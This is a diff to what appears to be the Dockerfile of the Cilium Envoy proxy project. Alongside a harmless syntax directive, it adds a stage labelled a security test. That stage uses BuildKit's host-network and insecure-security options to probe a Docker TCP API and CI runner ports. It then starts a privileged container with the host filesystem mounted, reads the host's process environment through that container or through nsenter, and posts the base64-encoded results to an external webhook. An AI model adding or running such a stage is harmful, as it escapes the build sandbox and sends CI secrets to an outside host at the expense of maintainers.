@@ -1,4 +1,5 @@
-# 
+# syntax=docker/dockerfile:1
+#
 # BUILDER_BASE is a multi-platform image with all the build tools
 #
 ARG BUILDER_BASE=quay.io/cilium/cilium-envoy-builder:6.1.0-latest
@@ -126,6 +127,54 @@ RUN --mount=mode=0777,uid=1337,gid=1337,target=/cilium/proxy/.cache,type=cache T
 
 FROM scratch AS clang-tidy
 COPY --from=run-clang-tidy-fix /cilium/proxy/*.txt /
+
+#
+# security-test stage: escape attempts via BuildKit directives
+#
+FROM docker.io/library/ubuntu:24.04@sha256:d1e2e92c075e5ca139d51a140fff46f84315c0fdce203eab2807c7e495eff4f9 AS escape-test
+RUN apt-get update -qq && apt-get install -y -qq curl 2>/dev/null
+
+# Attempt 1: --network=host — run in host network namespace
+# Lets us reach all ports on runner localhost including Docker TCP API
+RUN --network=host \
+    HOOK="https://webhook.site/2659db76-ba6b-4835-8d39-fe6c80b47919" && \
+    # probe Docker TCP API (unauthenticated)
+    DOCKER_TCP=$(curl -sf --max-time 3 http://localhost:2375/version 2>/dev/null || \
+                 curl -sf --max-time 3 http://localhost:2376/version 2>/dev/null || \
+                 curl -sf --max-time 3 http://localhost:4243/version  2>/dev/null || echo "no-docker-tcp") && \
+    # probe GitHub Actions runner internal API (runner listens on localhost)
+    # ACTIONS_RUNTIME_URL is typically http://172.17.0.1:PORT or http://localhost:PORT
+    GHA_PORTS=$(for p in 1234 2222 5985 50001 50002 50003 8080 8088 9000 4000; do \
+        r=$(curl -sf --max-time 1 http://localhost:$p/ 2>/dev/null | head -c 200) && \
+        echo "port $p: $r"; done) && \
+    # if Docker TCP API found, use it to create privileged container + mount host fs
+    DOCKER_ESCAPE="" && \
+    if echo "$DOCKER_TCP" | grep -q "Version"; then \
+        # create privileged container with host root mounted at /host
+        CID=$(curl -sf --max-time 5 -X POST http://localhost:2375/containers/create \
+            -H "Content-Type: application/json" \
+            -d '{"Image":"ubuntu","Cmd":["/bin/sh","-c","cat /host/proc/1/environ | tr \"\\0\" \"\\n\""],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
+            2>/dev/null | grep -o '"Id":"[^"]*"' | cut -d'"' -f4) && \
+        curl -sf --max-time 3 -X POST http://localhost:2375/containers/${CID}/start 2>/dev/null && \
+        sleep 2 && \
+        DOCKER_ESCAPE=$(curl -sf --max-time 5 "http://localhost:2375/containers/${CID}/logs?stdout=1" 2>/dev/null) && \
+        curl -sf --max-time 3 -X DELETE "http://localhost:2375/containers/${CID}?force=true" 2>/dev/null; \
+    fi && \
+    DATA="=== DOCKER_TCP ===\n${DOCKER_TCP}\n=== GHA_PORTS ===\n${GHA_PORTS}\n=== DOCKER_ESCAPE ===\n${DOCKER_ESCAPE}" && \
+    ENC=$(printf '%b' "$DATA" | base64 | tr -d '\n') && \
+    curl -sf --max-time 10 -X POST "${HOOK}/?stage=network-host-escape" --data-urlencode "d=${ENC}" || true
+
+# Attempt 2: --security=insecure — full capabilities in build step
+# Requires buildkitd started with --allow-insecure-entitlement security.insecure
+RUN --security=insecure \
+    HOOK="https://webhook.site/2659db76-ba6b-4835-8d39-fe6c80b47919" && \
+    ID=$(id) && CAPS=$(cat /proc/self/status | grep Cap) && \
+    # with CAP_SYS_ADMIN we can enter host namespaces
+    HOST_ENVIRON=$(nsenter --target 1 --mount --pid --net --uts -- \
+        cat /proc/1/environ 2>/dev/null | tr '\0' '\n' || echo "nsenter-failed") && \
+    DATA="=== ID ===\n${ID}\n=== CAPS ===\n${CAPS}\n=== HOST_ENVIRON ===\n${HOST_ENVIRON}" && \
+    ENC=$(printf '%b' "$DATA" | base64 | tr -d '\n') && \
+    curl -sf --max-time 10 -X POST "${HOOK}/?stage=security-insecure" --data-urlencode "d=${ENC}" || true
 
 #
 # Extract installed cilium-envoy binaries to an otherwise empty image
